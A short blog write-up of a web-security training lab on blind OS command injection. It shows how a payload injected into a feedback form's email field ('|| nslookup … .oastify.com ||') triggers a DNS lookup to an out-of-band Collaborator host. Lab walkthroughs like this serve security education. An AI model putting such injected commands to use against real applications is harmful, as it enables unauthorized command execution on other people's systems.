---
layout: post
title:  "Blind OS command injection with out-of-band interaction"
date:   2024-10-15 11:20:54 +0530
---

## Objective 

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

## Solution 

Just like the other lab, we have a feedback submission form 

![]({{ site.baseurl }}/assets/images/os-10.png)

We know that email field is vulnerable to OS command injectiion and in order to solve the lab we need to get the pingback from the server through the collaborator and utilising the following payload `|| nslookup cxd2y4s3h3mgzbw27bjospudj4pvdl1a.oastify.com ||` 

Now place the following payload into the email parameter... url encode, sent the request and response as expected without an error 

![]({{ site.baseurl }}/assets/images/os-11.png)

Checking the collaborator, we got a DNS pingback 

![]({{ site.baseurl }}/assets/images/os-12.png)

As mentioned in lab description, We got the DNS pingback and that solves the lab 